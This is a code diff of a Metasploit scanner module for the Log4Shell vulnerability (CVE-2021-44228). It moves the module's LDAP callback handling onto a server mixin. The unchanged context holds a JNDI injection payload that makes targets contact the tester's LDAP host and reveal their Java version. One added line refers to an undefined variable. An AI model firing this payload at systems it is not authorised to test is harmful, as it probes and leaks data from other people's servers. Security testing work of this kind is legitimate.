@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Remote::LDAP::Server
   include Msf::Auxiliary::Scanner
 
   def initialize
@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Auxiliary
         Apache JSPWiki, Apache OFBiz.
       },
       'Author' => [
-        'Spencer McIntyre'
+        'Spencer McIntyre', # The fun stuff
+        'RageLtMan <rageltman[at]sempervictus>', # Some plumbing
       ],
       'References' => [
         [ 'CVE', '2021-44228' ],
@@ -35,9 +36,6 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'DisclosureDate' => '2021-12-09',
       'License' => MSF_LICENSE,
-      'DefaultOptions' => {
-        'SRVPORT' => 389
-      },
       'Notes' => {
         'Stability' => [CRASH_SAFE],
         'SideEffects' => [IOC_IN_LOGS],
@@ -73,44 +71,60 @@ class MetasploitModule < Msf::Auxiliary
     "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
   end
 
-  def on_client_connect(client)
-    client.extend(Net::BER::BERParser)
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::BindRequest
+  #
+  # Handle incoming requests via service mixin
+  #
+  def on_dispatch_request(client, data)
+    return if data.strip.empty?
 
-    response = [
-      pdu.message_id.to_ber,
-      [
-        Net::LDAP::ResultCodeSuccess.to_ber_enumerated, ''.to_ber, ''.to_ber
-      ].to_ber_appsequence(Net::LDAP::PDU::BindResult)
-    ].to_ber_sequence
-    client.write(response)
-
-    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
-    return unless pdu.app_tag == Net::LDAP::PDU::SearchRequest
-
-    base_object = pdu.search_parameters[:base_object].to_s
-    token, java_version = base_object.split('/', 2)
-
-    target_info = @mutex.synchronize { @tokens.delete(token) }
-    if target_info
-      details = normalize_uri(target_info[:target_uri]).to_s
-      details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
-      details << " (java: #{java_version})" unless java_version.blank?
-      peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
-      print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
-      report_vuln(
-        host: target_info[:rhost],
-        port: target_info[:rport],
-        info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
-        name: name,
-        refs: references
-      )
+    data.extend(Net::BER::Extensions::String)
+    begin
+      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
+      vprint_status("LDAP request data remaining: #{data}") if !data.empty?
+      resp = case pdu.app_tag
+             when Net::LDAP::PDU::BindRequest # bind request
+               client.authenticated = true
+               service.encode_ldap_response(
+                 pdu.message_id,
+                 Net::LDAP::ResultCodeSuccess,
+                 '',
+                 '',
+                 Net::LDAP::PDU::BindResult
+               )
+             when Net::LDAP::PDU::SearchRequest # search request
+               if client.authenticated || datastore['LDAP_AUTH_BYPASS']
+                 # Perform query against some loaded LDIF structure
+                 treebase = pdu.search_parameters[:base_object].to_s
+                 token, java_version = treebase.split('/', 2)
+                 target_info = @mutex.synchronize { @tokens.delete(token) }
+                 if target_info
+                   details = normalize_uri(target_info[:target_uri]).to_s
+                   details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
+                   details << " (java: #{java_version})" unless java_version.blank?
+                   peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
+                   print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
+                   report_vuln(
+                     host: target_info[:rhost],
+                     port: target_info[:rport],
+                     info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
+                     name: name,
+                     refs: references
+                   )
+                 end
+                 nil
+               else
+                 service.encode_ldap_response(pdu.message_id, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)
+               end
+             else
+               vprint_status("Client sent unexpected request #{tag}")
+               client.close
+             end
+      resp.nil? ? client.close : on_send_response(client, resp)
+    rescue StandardError => e
+      print_error("Failed to handle LDAP request due to #{e}")
+      client.close
     end
-  rescue Net::LDAP::PDU::Error => e
-    vprint_error("#{peer} - #{e}")
-  ensure
-    service.close_client(client)
+    resp
   end
 
   def rand_text_alpha_lower_numeric(len, bad = '')
@@ -124,9 +138,8 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['SRVHOST'])
     @mutex = Mutex.new
     @tokens = {}
-    # always disable SSL because the LDAP server doesn't use it but the setting is shared with the HTTP requests
     begin
-      start_service('SSL' => false)
+      start_service
     rescue Rex::BindFailed => e
       fail_with(Failure::BadConfig, e.to_s)
     end
